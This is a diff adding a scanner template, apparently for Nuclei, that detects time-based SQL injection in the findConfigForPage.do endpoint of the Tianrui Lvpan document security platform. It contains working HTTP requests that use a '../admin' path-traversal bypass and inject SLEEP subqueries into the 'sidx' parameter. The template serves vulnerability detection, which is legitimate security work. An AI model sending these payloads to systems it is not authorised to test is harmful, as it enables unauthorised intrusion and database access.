@@ -1,0 +1,28 @@
+id: tianrui-findConfigForPage_do-sql-time
+
+info:
+  name: 天锐绿盘文档安全管理平台 findConfigForPage.do SQL注入漏洞
+  author: tianrui
+  severity: high
+  tags: sql injection
+
+http:
+  - raw:
+      - |
+        POST /lddsm/service/../admin/config/findConfigForPage.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        page=1&rows=10&sidx=(SELECT * FROM (SELECT(SLEEP(4)))x)
+      - |
+        POST /lddsm/service/../admin/config/findConfigForPage.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        page=1&rows=10&sidx=(SELECT * FROM (SELECT(SLEEP(8)))x)
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=4 && duration_1<=5'  
+          - 'duration_2>=8 && duration_2<=9'
+        condition: and
